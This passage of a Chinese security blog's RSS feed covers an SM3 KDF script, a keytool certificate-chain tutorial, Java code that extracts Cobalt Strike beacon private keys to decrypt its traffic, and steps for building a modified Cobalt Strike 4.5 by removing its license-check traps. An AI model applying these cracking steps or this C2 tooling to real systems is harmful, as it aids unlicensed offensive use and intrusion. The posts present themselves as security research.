&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  klen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(klen)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000001&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  rcnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ceil(klen&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Zin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hex2byte(Z)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Ha &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(rcnt):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Zin  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; hex2byte(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%08x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ct)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# print(msg)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    Ha &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ha &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sm3_hash(msg)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# print(Ha)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    ct &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Ha[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: klen &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(KDF(Z,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;upper())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实KDF就是一个使用SM3算法不断拓展长度的过程，对上述脚本进行分析&lt;/p&gt;</description>
    </item>
    <item>
      <title>keytool 生成证书链</title>
      <link>http://localhost:1313/posts/keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E9%93%BE/</link>
      <pubDate>Tue, 14 Feb 2023 01:21:09 +0800</pubDate>
      <guid>http://localhost:1313/posts/keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E9%93%BE/</guid>
      <description>&lt;h2 id=&#34;数字证书基本概念&#34;&gt;数字证书基本概念&lt;/h2&gt;&#xA;&lt;p&gt;数字证书‌是一种由受信任的第三方机构（称为证书颁发机构，CA）颁发的电子文档，用于证明公钥的所有权。数字证书包含了证书持有者的信息（如名称和电子邮件地址）、证书持有者的公钥、证书有效期以及CA的签名等信息。其主要作用包括：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;‌&lt;strong&gt;身份验证&lt;/strong&gt;‌：帮助用户验证对方的身份，确保通信双方是合法的。&lt;/li&gt;&#xA;&lt;li&gt;‌&lt;strong&gt;数据加密&lt;/strong&gt;‌：通过公钥和私钥配对，保证数据传输的安全性。&lt;/li&gt;&#xA;&lt;li&gt;‌&lt;strong&gt;数据完整性&lt;/strong&gt;‌：通过数字签名确认数据在传输过程中未被篡改‌。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;‌证书链‌是一系列数字证书的集合，用于建立一个信任路径，从而验证证书的有效性。证书链从一个受信任的根证书颁发机构（Root CA）开始，经过一个或多个中间证书颁发机构（Intermediate  CAs），最终到达目标证书（如服务器或个人证书）。每个中间CA的证书都由上一级CA签名。证书链的工作原理基于信任传递机制，即如果你信任根证书颁发机构，那么你也可以信任它所签发的所有证书，包括中间CA证书和最终的服务器或个人证书。这种机制确保了数字证书体系的安全性和可扩展性‌。&lt;/p&gt;&#xA;&lt;h3 id=&#34;数字证书和证书链的重要性&#34;&gt;数字证书和证书链的重要性&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;‌&lt;strong&gt;建立信任关系&lt;/strong&gt;‌：通过验证证书链，用户可以确认一个网站的真实性和安全性，防止钓鱼攻击和确保网站身份的真实性‌。&lt;/li&gt;&#xA;&lt;li&gt;‌&lt;strong&gt;加强数据安全&lt;/strong&gt;‌：数字证书链确保了公钥的真实来源，使得数据加密和数字签名过程更加安全可靠‌。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;生成根证书&#34;&gt;生成根证书&lt;/h2&gt;&#xA;&lt;p&gt;安装好java，确保keytool可以正常使用，开始配置证书链&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;keytool -genkeypair -validity 36500 -keyalg EC -keypass 12345678 -storepass 12345678 -dname &amp;#34;CN=y4,C=CN,OU=y4&amp;#34; -alias rootca -keystore root.jks&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241207102750805.png&#34; alt=&#34;image-20241207102750805&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此命令使用椭圆曲线secp256r1算法，产生一个256位的EC密钥对，并保存到njhx_root.jks中。使用以下命令查看密钥库的信息，会发现发布者与所有者都是y4&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; keytool -list -keystore root.jks -keypass 12345678 -storepass 12345678 -v&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241207103012129.png&#34; alt=&#34;image-20241207103012129&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;从根证书密钥库导出根证书&#34;&gt;从根证书密钥库导出根证书&lt;/h2&gt;&#xA;&lt;p&gt;使用keytool的导出功能，从密钥库中导出根证书，输入密钥库的密码，导出的证书文件为rootca.cer命令如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;keytool -exportcert -validity 36500 -alias rootca -file root.cer -keystore root.jks -keypass 12345678 -storepass 12345678&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241207103217902.png&#34; alt=&#34;image-20241207103217902&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;生成二级证书密钥库&#34;&gt;生成二级证书密钥库&lt;/h2&gt;&#xA;&lt;p&gt;二级证书需要由根证书签发。&lt;/p&gt;&#xA;&lt;p&gt;首先使用keytool生成二级证书的密钥库，但是此时还是自签的，我们需要从中生成一个二级证书请求（其中包含了二级证书的公钥）；&lt;/p&gt;&#xA;&lt;p&gt;然后将证书请求发送到rootca签发二级证书；&lt;/p&gt;&#xA;&lt;p&gt;最后，我们将rootca签发的二级证书导入到证书密钥库中，完成二级证书的生成。&lt;/p&gt;&#xA;&lt;p&gt;下面命令是生成二级证书密钥库，密钥库的名称为spky4，此时仍是自签的，证书颁发者和使用者都是自已：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;keytool -genkeypair -validity 36500 -keyalg EC -keypass 12345678 -storepass 12345678 -dname &amp;#34;CN=y4.com,C=CN,OU=y4&amp;#34; -alias spky4 -keystore sub.jks&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../index_files/image-20241207103421561.png&#34; alt=&#34;image-20241207103421561&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CS反制浅析——从伪装上线到RCE</title>
      <link>http://localhost:1313/posts/cs%E5%8F%8D%E5%88%B6%E6%B5%85%E6%9E%90%E4%BB%8E%E4%BC%AA%E8%A3%85%E4%B8%8A%E7%BA%BF%E5%88%B0rce/</link>
      <pubDate>Tue, 06 Dec 2022 02:13:01 +0800</pubDate>
      <guid>http://localhost:1313/posts/cs%E5%8F%8D%E5%88%B6%E6%B5%85%E6%9E%90%E4%BB%8E%E4%BC%AA%E8%A3%85%E4%B8%8A%E7%BA%BF%E5%88%B0rce/</guid>
      <description>&lt;h1 id=&#34;cs反制浅析从伪装上线到rce&#34;&gt;CS反制浅析——从伪装上线到RCE&lt;/h1&gt;&#xA;&lt;p&gt;文章不是一个时间段写的（主要内容都是好多年前写的，用的版本比较旧，后面一部分代码截图分析用的新版本，看核心逻辑一样就懒得找老版本了），截图使用的版本有些乱，因为现在准备发的时候发现之前的图有点问题，重新复现或者分析截一下，反正原理是一样的，核心没有变，不要在意细节。本文仅用作安全技术研究。&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs流量分析&#34;&gt;CS流量分析&lt;/h2&gt;&#xA;&lt;p&gt;通过CS上线，抓包并筛选HTTP流量&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/AI13EcDdLlElcfSviBXNooiZkJbJJasiKdqn-2HoTRU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;定位到上线的包，里面包含cookie，cookie即为加密字段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/1HXst4CcPDxnU6oqd4Wd-M4Dtj1wcRAWDk3eCKA4m6I.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;分析逆向后的CobaltStrike源码，定位到BeaconHTTP类中的Beacon Entry&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/skB0MMvnnIK4Hph5Ijv7A-7AB5hsYd4OHqpaND8gB8s.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟进到C2Beacon类，BeaconEntry入口点在此处进行定义&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/BAT6eLZ2kG7wA-971kccfMEnVRCDX_d7l02dVAI_cFc.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟进AsymmetricCrypto方法后进入AsymmetricCrypto类，其中是一个明显的RSA加密，模式未ECB，填充方式为PKCS1&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/l8TljA7bgkhS2Myu4n4tpU1PnQF1Pg5JuOAwp-WnDIQ.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续往下跟到decrypt方法，RSA的解密需要调用私钥&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/UeXzc4yjPBaJubWXmOwV23B-aBybT1ZBg-zZGHePSdw.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;回到BeaconC2类，其中对asecurity变量的赋值只有再setCrypto方法中存在&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/b-L_P1_7hxEsjsuFefAcNd06zbIzUmmdGVp1iXqCSlo.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用IDEA全局搜索功能定位调用的文件，出现在BeaconSetup类中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/yiqaoFiRAr-tsiLrVmSSCotn9gZohWqsAZEybF0_qwU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/QHJj1F5GyqLnL-t4PuYlgKS1SQOZ8WnuQJq3qq9HLqU.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续跟传入的参var2，var2的值来自beacon_asymmetric()方法，这个方法在同个类中定义，这其中的关键就是.cobaltstrike.beacon_keys&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/mte_kFVY_Bisq2X6ZYuAvhYYzqTDKQQXj5ysAU0Xkrc.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这个文件在cs运行目录下也能找到，是beacon的key文件，通常情况下通过一些工具就可以解析公钥，比如GitHub上的CobaltStrikeParser能解析默认配置下的stage信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fakecs/oug1LIjpBoKssjcuMO7iw4rfVORZzk8PFb1fYUDuUXE.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;要取得私钥需要通过一些方法，根据上面的代码，编写一个工具类用于提取私钥，这个代码很多人都写过，直接拿大佬写完的也行&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.File;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Base64;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; common.CommonUtils;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.security.KeyPair;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DumpKeys&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            File file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; File(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.cobaltstrike.beacon_keys&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (file.&lt;span style=&#34;color:#a6e22e&#34;&gt;exists&lt;/span&gt;()) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                KeyPair keyPair &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (KeyPair)CommonUtils.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;(file, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Private Key: %s\n\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; String(Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt;(keyPair.&lt;span style=&#34;color:#a6e22e&#34;&gt;getPrivate&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoded&lt;/span&gt;())));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Public Key: %s\n\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; String(Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt;(keyPair.&lt;span style=&#34;color:#a6e22e&#34;&gt;getPublic&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoded&lt;/span&gt;())));&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not find .cobaltstrike.beacon_keys file&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception exception) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not read asymmetric keys&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用此代码读取beacon_keys即可进行解密，运行前需设置classpath为cs的jar包文件&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（四）——深入解析Cobaltstrike（二开环境与认证过程分析）</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E5%9B%9B%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cobaltstrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E4%B8%8E%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</link>
      <pubDate>Sat, 06 Aug 2022 19:47:18 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E5%9B%9B%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cobaltstrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E4%B8%8E%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</guid>
      <description>&lt;p&gt;文章其实22年就写了，因为一些原因没有发，本来是笔记，删删改改处理了一些东西后发布&lt;/p&gt;&#xA;&lt;p&gt;之前研究的版本太老了，找个稍微新一点的版本，选用CS4.5进行研究，另外，刚好官方文档描述CS4.5更新了license验证机制，官网链接https://www.cobaltstrike.com/blog/cobalt-strike-4-5-fork-run-youre-history&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215153237060.png&#34; alt=&#34;image-20241215153237060&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;二开环境配置&#34;&gt;二开环境配置&lt;/h2&gt;&#xA;&lt;p&gt;下载完先和官网对比一下hash值避免被加料&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241211000754709.png&#34; alt=&#34;image-20241211000754709&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;反编译的方法很多就不赘述了，百度一下能搜到一堆（jd、java-decompiler&amp;hellip;）但是由于有些工具无法识别lambda表达式，因此选择的时候建议找个合适的&lt;/p&gt;&#xA;&lt;p&gt;并在dependencies中加入依赖，直接添加library或从jar包添加都行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215112215268.png&#34; alt=&#34;image-20241215112215268&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;CS的启动类为aggressor.Aggressor，将该文件复制到src目录下，配置Artifact选项，以生成jar包，其中Manifest文件复制lib中的Manifest即可，之后编译Artifact包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113422438.png&#34; alt=&#34;image-20241215113422438&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启动前添加配置，其中JAR地址为刚刚编译的jar包，VM选项为&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113528425.png&#34; alt=&#34;image-20241215113528425&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在代码中加入一个弹窗显示消息，并测试是否能够成功执行&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;JOptionPane.showMessageDialog(null,&amp;#34;CS4.5 Modified BY:Y4ph3tS&amp;#34;);&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113740524.png&#34; alt=&#34;image-20241215113740524&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过刚刚配置好的模板运行，弹出窗口即成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215113856301.png&#34; alt=&#34;image-20241215113856301&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;认证流程简析与去暗桩&#34;&gt;认证流程简析与去暗桩&lt;/h2&gt;&#xA;&lt;p&gt;由于是原版没有进行破解，所以之后会报错退出，接下来研究一下验证的逻辑，并且进行暗桩的去除&lt;/p&gt;&#xA;&lt;p&gt;beacon/BeaconData.java&lt;/p&gt;&#xA;&lt;p&gt;shouldPad设置为false&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215115314402.png&#34; alt=&#34;image-20241215115314402&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;beacon/CommandBuilder.java&lt;/p&gt;&#xA;&lt;p&gt;在文件最后的static方法中，有大量对变量var1的修改，分析后发现是校验逻辑之一，如果var1为false则程序退出，因此只需保证var1永真&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215120926725.png&#34; alt=&#34;image-20241215120926725&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来分析核心部分common/Authorization.java，其中主要步骤是校验cobaltstrike.auth，其中对auth文件进行了校验，读取到auth文件并经过格式校验后，调用AuthCrypto的decrypt进行解密&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215141215124.png&#34; alt=&#34;image-20241215141215124&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跟进AuthCrypto，可见其中有一个RSA Key验证操作，先读取authkey.pub公钥文件的md5值，如果通过验证就获取其中的公钥值，生成的操作，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../C2reborn/image-20241215141457879.png&#34; alt=&#34;image-20241215141457879&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完整代码如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AuthCrypto&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Cipher.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA/ECB/PKCS1Padding&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 